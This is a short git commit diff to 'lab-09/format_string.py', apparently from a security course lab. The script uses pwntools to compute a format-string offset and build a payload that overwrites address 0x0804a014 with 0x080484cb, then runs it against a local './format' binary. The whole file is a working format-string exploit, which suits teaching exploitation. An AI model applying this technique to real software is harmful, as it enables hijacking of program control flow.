783a54615b8704f5e42381790ec52e671c349cf4
sploitem <34443980+sploitem@users.noreply.github.com>
2018-08-03 16:48:01 +0300

    Update format_string.py

--- lab-09/format_string.py
+++ lab-09/format_string.py
@@ -8,9 +8,8 @@ def exec_fmt(payload):
 context.clear(arch = 'i386')
 autofmt = FmtStr(exec_fmt)
 offset = autofmt.offset
-writes = {0x0804a014 : 0x14, 0x0804a014+1 : 0xa0, 0x0804a014+2 : 0x04, 0x0804a014+3 : 0x08}
+
 payload = fmtstr_payload(offset, {0x0804a014 : 0x080484cb}, write_size = 'short')
 
-# payload = fmtstr_payload(offset, {0x0804a014 : 0x080484cb})
 print repr(fmtstr_payload(offset, {0x0804a014 : 0x080484cb}, write_size = 'byte'))
 p = process(['./format', payload])
